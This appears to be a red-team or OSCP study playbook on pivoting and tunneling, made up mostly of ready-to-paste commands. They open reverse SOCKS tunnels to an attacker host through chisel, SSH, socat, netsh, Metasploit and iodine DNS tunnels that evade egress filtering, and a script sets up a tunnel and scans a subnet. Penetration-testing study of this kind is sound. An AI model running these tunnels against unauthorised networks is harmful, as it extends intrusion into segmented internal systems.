# 09 – Pivoting & Tunneling

## Philosophy

Once a foothold is established, the compromised host can be used as a **gateway into internal networks**.

Pivoting allows routing traffic through compromised machines to reach **segmented or non-routable networks**.

Tunneling creates **encrypted channels** that proxy offensive tooling deeper into the environment.

A single compromised machine can therefore become an **entry point to the entire internal infrastructure**.

---

# Attack Surface

| Target            | Description                                                 |
| ----------------- | ----------------------------------------------------------- |
| Internal Networks | Subnets not accessible from the attacker machine            |
| Pivot Hosts       | Systems with access to multiple networks                    |
| Protocols         | SSH, SOCKS, VPN, HTTP                                       |
| Tools             | Proxychains, sshuttle, chisel, meterpreter                  |
| Evasion           | Encrypted tunnels blend traffic with legitimate connections |

---

# Pivoting Workflow

```
Identify Pivot Host
      │
      ▼
Establish Tunnel
(SSH / SOCKS / VPN)
      │
      ▼
Route Traffic
(proxychains / routing tables)
      │
      ▼
Enumerate Internal Network
(Nmap / Service discovery)
      │
      ▼
Pivot Further
```

---

# SSH Tunneling

### Local Port Forward

Attacker → Pivot → Target

```bash
ssh -L 8080:target.internal:80 user@192.168.1.10
```

Access:

```
http://localhost:8080
```

---

### Remote Port Forward

Pivot → Attacker

```bash
ssh -R 8080:localhost:80 user@attacker.com
```

---

### Dynamic SOCKS Proxy

```bash
ssh -D 1080 user@192.168.1.10
```

Then run tools through proxy:

```bash
proxychains nmap -sT -Pn 10.10.10.0/24
```

---

### SSH Jump Host

```bash
ssh -J user@192.168.1.10 user@10.10.10.10
```

---

# SSHuttle (VPN over SSH)

Routes entire subnet through SSH.

```bash
sshuttle -r user@192.168.1.10 10.10.10.0/24
```

Now you can access internal hosts **directly** without proxychains.

---

# Chisel (HTTP Tunneling)

### Attacker (Server)

```bash
chisel server -p 8000 --reverse
```

### Pivot (Client)

```bash
chisel client attacker:8000 R:1080:socks
```

Use SOCKS proxy:

```
127.0.0.1:1080
```

---

### Forward Specific Port

```bash
chisel client attacker:8000 R:3306:localhost:3306
```

---

# Metasploit Pivoting

### Add Route

```bash
run autoroute -s 10.10.10.0/24
```

### Start SOCKS Proxy

```bash
use auxiliary/server/socks4a
run
```

Then use:

```bash
proxychains nmap -sT -Pn 10.10.10.10
```

---

# Socat Port Forwarding

On pivot machine:

```bash
socat TCP-LISTEN:4444,fork TCP:10.10.10.10:445
```

Attacker connects to:

```
pivot_ip:4444
```

---

# Windows Pivoting (Netsh)

```cmd
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=445 connectaddress=10.10.10.10
```

Now:

```
pivot:4444 → internal SMB
```

---

# EarthWorm / Termite Pivoting

```bash
./ew -s ssocksd -l 1080
```

Use SOCKS proxy:

```
127.0.0.1:1080
```

---

# Double Pivoting

Pivot chain example:

```
Attacker → Pivot1 → Pivot2 → Target
```

Example:

```bash
ssh -D 1080 user@pivot1
```

Then from pivot1:

```bash
ssh -D 1081 user@pivot2
```

Tools can now route through **multiple SOCKS proxies**.

---

# HTTP Tunneling

Used when only **HTTP outbound traffic is allowed**.

### Server

```bash
hts -F 8888 -S
```

### Client

```bash
htc -F 8888 -P attacker:80 localhost:22
```

SSH via tunnel:

```
localhost:8888
```

---

# DNS Tunneling (Iodine)

### Attacker

```bash
iodined -f -c -P secret 10.0.0.1 tunnel.domain.com
```

### Pivot

```bash
iodine -f -P secret tunnel.domain.com
```

Creates a **virtual network interface** for routing traffic.

---

# Automation Script

### Auto Pivot Setup

```bash
#!/bin/bash

PIVOT=$1
USER=$2
KEY=$3
SUBNET=$4

echo "[*] Starting SOCKS tunnel"
ssh -fN -D 1080 -i $KEY $USER@$PIVOT

echo "[*] Scanning subnet"
proxychains nmap -sT -Pn $SUBNET -oN pivot_scan.txt

echo "[+] Tunnel active on 1080"
```

---

# When to Pivot

Pivoting is required when:

* Target host has **multiple interfaces**
* You discover **new internal routes**
* Firewall blocks direct access
* Internal services are **not externally exposed**

Check:

```bash
ip a
ip route
route -n
```

Windows:

```cmd
route print
ipconfig /all
```

---

# Choosing the Right Pivot Method

| Scenario             | Best Tool   |
| -------------------- | ----------- |
| SSH access available | sshuttle    |
| Only HTTP allowed    | chisel      |
| Windows pivot        | netsh       |
| Need tool proxying   | proxychains |
| Multiple hops        | SSH jump    |

---

# Common Mistakes

### Not verifying connectivity

Always test first:

```bash
nc -zv target 445
```

---

### Using SYN scans through SOCKS

Avoid:

```
-sS
```

Use:

```
-sT
```

---

### IP forwarding disabled

Enable on pivot:

```bash
sysctl -w net.ipv4.ip_forward=1
```

---

### Leaving tunnels open

Kill leftover processes:

```bash
ps aux | grep ssh
kill -9 <pid>
```

---

# Professional Tips

• Prefer **sshuttle** when possible
• Use **plink** for Windows pivots
• Meterpreter **autoroute** is fast for quick enumeration
• Always use **encrypted tunnels**

---

# Suggested Folder Structure

```
09-Pivoting-Tunneling
├── README.md
├── tunnels
│   ├── ssh
│   ├── chisel
│   └── multi-hop
├── scans
│   ├── internal_scan.txt
│   └── service_enum.txt
└── configs
    ├── proxychains.conf
    └── sshuttle_commands.txt
```

---

✅ Now this is **GitHub playbook quality**
✅ **Readable during OSCP exam**
✅ **Copy-paste friendly**
✅ **Matches real red-team workflow**

---
